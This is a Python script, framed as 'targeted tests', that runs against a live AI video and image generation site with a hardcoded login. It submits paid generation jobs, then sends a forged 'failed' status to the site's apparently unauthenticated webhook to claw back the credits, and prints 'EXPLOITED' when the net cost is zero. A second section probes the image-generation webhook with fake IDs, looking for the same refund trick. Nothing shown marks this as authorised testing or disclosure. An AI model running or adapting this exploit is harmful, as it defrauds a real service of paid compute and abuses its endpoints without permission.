"""
test_mc_and_imggen.py
=====================
Two targeted tests:

1. Kling Motion Control (/api/ai-clone/generate)
   - Uses viewmax's own demo video from their Supabase CDN (guaranteed valid dims)
   - Checks if soraTaskId appears in status endpoint → webhook refund

2. Nano Banana Pro (/api/image-generation/generate)
   - Probes /api/image-generation/webhook (does it exist?)
   - Inspects full image gen response for any task ID / async handle
   - Checks if image credits change after any webhook attempt
"""

import requests, time, json, sys

EMAIL    = "quicken-jolt-crave@duck.com"
PASSWORD = "quicken-jolt-crave@duck.com"
BASE     = "https://www.viewmax.io"

print(f"Logging in as {EMAIL}...", end="", flush=True)
_sess = requests.Session()
_r = _sess.post(
    f"{BASE}/api/auth/sign-in/email",
    json={"email": EMAIL, "password": PASSWORD, "rememberMe": True},
    headers={"Content-Type": "application/json", "Accept": "application/json",
             "User-Agent": "Mozilla/5.0", "Origin": BASE, "Referer": BASE + "/"},
    timeout=20,
)
if _r.status_code not in (200, 201) or not _r.json().get("user"):
    print(f" FAILED: {_r.status_code} {_r.text[:200]}")
    sys.exit(1)
print(" OK")

TOKEN = "; ".join(f"{k}={v}" for k, v in _sess.cookies.items())
HDRS = {
    "Cookie":       TOKEN,
    "Content-Type": "application/json",
    "Accept":       "application/json",
    "User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Origin":       BASE,
    "Referer":      BASE + "/tools/video-generator",
}
WH_HDRS = {
    "Content-Type": "application/json",
    "Accept":       "application/json",
    "User-Agent":   "Mozilla/5.0",
    "Origin":       BASE,
    "Referer":      BASE + "/",
}

def get_credits():
    r = requests.get(f"{BASE}/api/me", headers=HDRS, timeout=15)
    d = r.json()
    svc = next((x for x in d.get("subscription", {}).get("services", []) if x["type"] == "AI_CREDITS"), {})
    img_svc = next((x for x in d.get("subscription", {}).get("services", []) if x.get("type") in ("IMAGE_CREDITS", "AI_IMAGE_CREDITS")), {})
    used  = svc.get("used", 0);  maxx  = svc.get("max", 0)
    video_credits = (maxx - used) + d.get("purchasedCredits", 0)
    img_credits = (img_svc.get("max", 0) - img_svc.get("used", 0)) if img_svc else "N/A"
    return video_credits, img_credits, d.get("subscription", {}).get("services", [])

def get_sora_task_id(gen_id, max_attempts=20):
    print(f"    polling soraTaskId", end="", flush=True)
    for _ in range(max_attempts):
        time.sleep(2)
        print(".", end="", flush=True)
        try:
            r = requests.get(f"{BASE}/api/video-generation/status",
                             headers=HDRS, params={"ids": gen_id}, timeout=15)
            if r.status_code != 200:
                continue
            d = r.json()
            gens = d.get("generations") or []
            if gens:
                sid = gens[0].get("soraTaskId")
                if sid:
                    print(f" FOUND: {sid[:28]}...")
                    return sid
            gen = d.get("generation") or {}
            sid = gen.get("soraTaskId")
            if sid:
                print(f" FOUND: {sid[:28]}...")
                return sid
        except Exception as e:
            print(f"[err:{e}]", end="", flush=True)
    print(" NOT FOUND")
    return None

def fire_webhook(sora_id):
    r = requests.post(f"{BASE}/api/video-generation/webhook",
                      headers=WH_HDRS,
                      json={"id": sora_id, "status": "failed"},
                      timeout=15)
    return r.status_code == 200 and r.json().get("success", False)


# ═══════════════════════════════════════════════════════════
# TEST 1: Kling Motion Control
# ═══════════════════════════════════════════════════════════
print("\n" + "="*60)
print("  TEST 1: Kling Motion Control")
print("="*60)

# viewmax's own Supabase demo video — exact format Kling expects
DEMO_VIDEO = "https://jktjxzjyhbbxlxrfmcdk.supabase.co/storage/v1/object/public/showcase/kling_motion.mp4"
# A proper portrait photo for the character
CHAR_IMAGE = "https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=720&q=80&fit=crop"

mc_payload = {
    "imageUrl":             CHAR_IMAGE,
    "videoUrl":             DEMO_VIDEO,
    "modelName":            "kling-v3",
    "mode":                 "std",
    "characterOrientation": "video",
    "keepOriginalSound":    "yes",
    "aspectRatio":          "9:16",
    "matchBackground":      False,
    "prompt":               "smooth natural motion",
}

vc_before, ic_before, _ = get_credits()
print(f"  Video credits before: {vc_before}")

print(f"  Submitting MC generation... ", end="", flush=True)
mc_r = requests.post(f"{BASE}/api/ai-clone/generate", headers=HDRS, json=mc_payload, timeout=30)
print(f"HTTP {mc_r.status_code}")

if mc_r.status_code == 200:
    mc_ids = mc_r.json().get("generationIds", [])
    mc_id  = mc_ids[0] if mc_ids else None
    print(f"  genId: {mc_id}")
    if mc_id:
        vc_after_submit, _, _ = get_credits()
        charged = vc_before - vc_after_submit
        print(f"  Credits after submit: {vc_after_submit}  (charged: {charged})")

        sora_id = get_sora_task_id(mc_id)
        if sora_id:
            ok = fire_webhook(sora_id)
            time.sleep(3)
            vc_after_refund, _, _ = get_credits()
            refunded = vc_after_refund - vc_after_submit
            net = vc_before - vc_after_refund
            print(f"  Webhook: {'OK ✅' if ok else 'FAILED ❌'}")
            print(f"  Credits after refund: {vc_after_refund}  (refunded: {refunded})  net: {net}")
            print(f"  → {'EXPLOITED ✅' if net == 0 else f'NOT FREE — net cost {net}'}")
        else:
            print("  → ❌ soraTaskId never appeared — MC uses different task system")
            print("  Raw status response:")
            rs = requests.get(f"{BASE}/api/video-generation/status",
                              headers=HDRS, params={"ids": mc_id}, timeout=15)
            print(f"    {rs.status_code}: {rs.text[:400]}")
else:
    print(f"  Full error: {mc_r.text[:400]}")


# ═══════════════════════════════════════════════════════════
# TEST 2: Nano Banana Pro — probe all angles
# ═══════════════════════════════════════════════════════════
print("\n" + "="*60)
print("  TEST 2: Nano Banana Pro (image gen)")
print("="*60)

vc_before2, ic_before2, all_services = get_credits()
print(f"  Video credits: {vc_before2}  |  Image credits: {ic_before2}")
print(f"  All services in subscription: {json.dumps(all_services, indent=2)[:600]}")

# 2a. Probe if image-generation webhook exists
print("\n  [2a] Probing /api/image-generation/webhook...")
for payload in [
    {"id": "test-fake-id", "status": "failed"},
    {"generationId": "test-fake-id", "status": "failed"},
    {"taskId": "test-fake-id", "status": "failed"},
]:
    r = requests.post(f"{BASE}/api/image-generation/webhook",
                      headers=WH_HDRS, json=payload, timeout=10)
    print(f"    payload keys={list(payload.keys())} → {r.status_code}: {r.text[:120]}")

# 2b. Submit an actual image generation and inspect the full response
print("\n  [2b] Submitting image generation...")
img_payload = {
    "prompt":      "a sunset over the ocean",
    "model":       "gemini-3-pro-image-preview",
    "aspectRatio": "16:9",
    "resolution":  "1024x576",
    "useSearch":   False,
    "includeText": True,
}
img_r = requests.post(f"{BASE}/api/image-generation/generate",
                      headers=HDRS, json=img_payload, timeout=90)
print(f"  HTTP {img_r.status_code}")
vc_after2, ic_after2, _ = get_credits()
img_charged_video = vc_before2 - vc_after2
print(f"  Video credits after: {vc_after2}  (charged from video pool: {img_charged_video})")
print(f"  Image credits after: {ic_after2}")

if img_r.status_code == 200:
    d = img_r.json()
    # Print everything EXCEPT the image base64 data
    d_clean = {k: (v if k != "images" else f"[{len(v)} image(s), data omitted]") for k, v in d.items()}
    print(f"  Response keys: {list(d.keys())}")
    print(f"  Response (no image data): {json.dumps(d_clean)[:600]}")
    
    # Look for any task/generation IDs in the response
    for key in ("generationId", "taskId", "id", "jobId", "generationIds"):
        if key in d:
            print(f"  !! Found field '{key}': {d[key]}")
    
    # 2c. If any ID found, try the video webhook with it
    gen_id = d.get("generationId") or d.get("taskId") or d.get("id") or d.get("jobId")
    if gen_id:
        print(f"\n  [2c] Found ID {gen_id} — trying video webhook refund...")
        ok = fire_webhook(gen_id)
        time.sleep(2)
        vc_final, ic_final, _ = get_credits()
        print(f"  Webhook result: {'OK' if ok else 'FAILED'}")
        print(f"  Credits final — video: {vc_final}  image: {ic_final}")
    else:
        print("\n  [2c] No async task ID in response — image gen is synchronous")
        print("       Credits are charged on submit, image returned immediately.")
        print("       → No webhook-style exploit possible for image gen.")
else:
    print(f"  Error: {img_r.text[:300]}")

print("\n" + "="*60 + "\n")
